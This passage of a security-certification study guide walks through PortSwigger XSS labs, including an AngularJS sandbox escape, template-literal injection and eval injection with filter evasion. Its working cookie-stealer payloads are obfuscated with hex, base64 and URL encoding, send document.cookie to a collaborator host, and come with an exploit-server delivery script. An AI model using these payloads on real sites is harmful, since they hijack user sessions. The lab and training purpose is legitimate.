class=\"pl-c1\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-en\"\u003estr\u003c/span\u003e(\u003cspan class=\"pl-en\"\u003eord\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003echar\u003c/span\u003e)) \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003echar\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einput_string\u003c/span\u003e]\n\n\u003cspan class=\"pl-s1\"\u003eoutput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\",\"\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ejoin\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eascii_values\u003c/span\u003e)\n\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eoutput\u003c/span\u003e)\n\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'PortSwigger Expert Academy Labs!'\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/python-script-ascii_converter.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/python-script-ascii_converter.png\" alt=\"python-script-ascii_converter.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCookie Stealer Payload in ASCII decimal value AngularJS expression run through sandbox, from the PortSwigger solution steps:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eThe exploit uses \u003ccode\u003etoString()\u003c/code\u003e to create a string without using quotes.\u003c/li\u003e\n\u003cli\u003eThen gets the String prototype and overwrites the \u003ccode\u003echarAt\u003c/code\u003e function for every string.\u003c/li\u003e\n\u003cli\u003eThis breaks the AngularJS sandbox. allow an array passed to the \u003ccode\u003eorderBy\u003c/code\u003e filter.\u003c/li\u003e\n\u003cli\u003eSet the argument for the filter by again using \u003ccode\u003etoString()\u003c/code\u003e to create a string and the String constructor property.\u003c/li\u003e\n\u003cli\u003eFinally, use the \u003ccode\u003efromCharCode\u003c/code\u003e method generate our payload by converting character codes into the payload example \u003ccode\u003ex=alert(1)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003echarAt\u003c/code\u003e function has been overwritten, AngularJS will allow this code to escape the \u003cstrong\u003eSandbox\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/angularJS-sandbox-escape-cookie-stealer.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/angularJS-sandbox-escape-cookie-stealer.png\" alt=\"angularJS-sandbox-escape-cookie-stealer\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings\" rel=\"nofollow\"\u003ePortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXSS Template Literal\u003c/h3\u003e\u003ca id=\"user-content-xss-template-literal\" class=\"anchor\" aria-label=\"Permalink: XSS Template Literal\" href=\"#xss-template-literal\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eJavaScript template literal is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e by the back ticks \u003cstrong\u003e`\u003c/strong\u003e used to contain the string. On the target code we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the search string is reflected inside a template literal string.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"${alert(document.cookie)}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e${alert(document.cookie)}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss-template-literal.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss-template-literal.png\" alt=\"xss template literal\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThanks to \u003cem\u003e\u003cstrong\u003eAdrin Gyurcz\u003c/strong\u003e\u003c/em\u003e, for providing awesome bypass where I failed to get a working cookie stealer bypass all filters for this lab.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eAdrin Gyurcz\u003c/strong\u003e\u003c/em\u003e found the following research article from Portswigger that lead to the solution:\u003cbr\u003e\n\u003ca href=\"https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows\" rel=\"nofollow\"\u003ebypassing-character-blocklists-with-unicode-overflows\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePivoting from above, his payload:\u003c/h4\u003e\u003ca id=\"user-content-pivoting-from-above-his-payload\" class=\"anchor\" aria-label=\"Permalink: Pivoting from above, his payload:\" href=\"#pivoting-from-above-his-payload\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAs the original lab session cookie has protection flags, he created a test dummy cookie for proof of concept:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ag1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ag1.png\" alt=\"Adrin Gyurcz\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eafter sending the payload in the search function, I got a cookie stealer hit:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ag2.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ag2.png\" alt=\"Adrin Gyurcz\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eI hope others find his research helpful, and including it in my guide Tx.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXSS via JSON into EVAL\u003c/h3\u003e\u003ca id=\"user-content-xss-via-json-into-eval\" class=\"anchor\" aria-label=\"Permalink: XSS via JSON into EVAL\" href=\"#xss-via-json-into-eval\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis \u003ca href=\"https://portswigger.net/web-security/certification/takepracticeexam/index.html\" rel=\"nofollow\"\u003ePortSwigger Practice Exam APP\u003c/a\u003e is performing search function and the \u003cstrong\u003eDOM Invader\u003c/strong\u003e \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the sink in an \u003ccode\u003eeval()\u003c/code\u003e function. The search results are placed into JSON content type.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader-eval-identify.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader-eval-identify.png\" alt=\"Dom Invader EVAL identify\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTest escape out of the \u003ccode\u003eJSON\u003c/code\u003e data and inject test payload \u003ccode\u003e\"-prompt(321)-\"\u003c/code\u003e into the JSON content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/json-injection-escape.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/json-injection-escape.png\" alt=\"json-injection-escape.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAttempting to get our own session cookie value with payload of \u003ccode\u003e\"-alert(document.cookie)-\"\u003c/code\u003e and filter message is returned stating \u003ccode\u003e\"Potentially dangerous search term\"\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eWAF is preventing dangerous search filters and tags, then we bypass WAF filters using JavaScript global variables.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;-alert(window[\u0026quot;document\u0026quot;][\u0026quot;cookie\u0026quot;])-\u0026quot;\n\u0026quot;-window[\u0026quot;alert\u0026quot;](window[\u0026quot;document\u0026quot;][\u0026quot;cookie\u0026quot;])-\u0026quot;\n\u0026quot;-self[\u0026quot;alert\u0026quot;](self[\u0026quot;document\u0026quot;][\u0026quot;cookie\u0026quot;])-\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\"-alert(window[\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"cookie\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003ewindow\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"alert\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003ewindow\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"document\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"cookie\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"alert\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"document\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"cookie\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\"\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/\" rel=\"nofollow\"\u003esecjuice: Bypass XSS filters using JavaScript global variables\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow is the main \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md\"\u003ecookie stealer payload\u003c/a\u003e before BASE 64 encoding it.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"fetch(`https://OASTIFY.COM/?jsonc=` + window[\u0026quot;document\u0026quot;][\u0026quot;cookie\u0026quot;])\"\u003e\u003cpre\u003e\u003cspan class=\"pl-en\"\u003efetch\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e`https://OASTIFY.COM/?jsonc=`\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ewindow\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"document\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"cookie\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNext is encode payload using \u003ca href=\"https://www.base64encode.org/\" rel=\"nofollow\"\u003eBase64 encoded\u003c/a\u003e value of the above cookie stealer payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTest payload on our own session cookie in Search function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;-eval(atob(\u0026quot;ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==\u0026quot;))-\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\"-eval(atob(\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"))-\"\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUnpacking above payload assembly stages:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eUsing the \u003cstrong\u003eeval()\u003c/strong\u003e method evaluates or executes an argument.\u003c/li\u003e\n\u003cli\u003eUsing \u003cstrong\u003eatob()\u003c/strong\u003e or \u003cstrong\u003ebtoa()\u003c/strong\u003e is function used for encoding to and from base64 format strings.\u003c/li\u003e\n\u003cli\u003eIf \u003cstrong\u003eeval()\u003c/strong\u003e being blocked then Alternatives:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003esetTimeout(\"code\")\u003c/li\u003e\n\u003cli\u003esetInterval(\"code)\u003c/li\u003e\n\u003cli\u003esetImmediate(\"code\")\u003c/li\u003e\n\u003cli\u003eFunction(\"code\")()\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis image shows Burp Collaborator receiving the my cookie value as proof of concept before setting up payload to \u003ccode\u003eDeliver exploit to victim\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss2.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss2.png\" alt=\"Burp collaborator receiving request with base64 cookie value from our POC.\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.urlencoder.org/\" rel=\"nofollow\"\u003eURL Encode\u003c/a\u003e all characters in this payload and use as the value of the \u003ccode\u003e/?SearchTerm=\u003c/code\u003e parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;-eval(atob(\u0026quot;ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==\u0026quot;))-\u0026quot;\"\u003e\u003cpre\u003e\"-eval(atob(\"ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==\"))-\"\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHosting the \u003ccode\u003eIFRAME\u003c/code\u003e on exploit server, give a \u003cstrong\u003eerror\u003c/strong\u003e message refused to connect to target. Instead host the payload on exploit server between \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e tags.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\nlocation = \u0026quot;https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22\u0026quot;\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003elocation\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22\"\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss1.png\" alt=\"(Deliver reflected xss to steal victim cookie.\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e \u003ccode\u003eDeliver exploit to victim\u003c/code\u003e few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move on to \u003ca href=\"#blind-time-delay\"\u003eStage 2 of the Practice Exam\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/certification/takepracticeexam/index.html\" rel=\"nofollow\"\u003ePortSwigger Practice Exam - Stage 1 - Foothold\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eStored XSS\u003c/h3\u003e\u003ca id=\"user-content-stored-xss\" class=\"anchor\" aria-label=\"Permalink: Stored XSS\" href=\"#stored-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 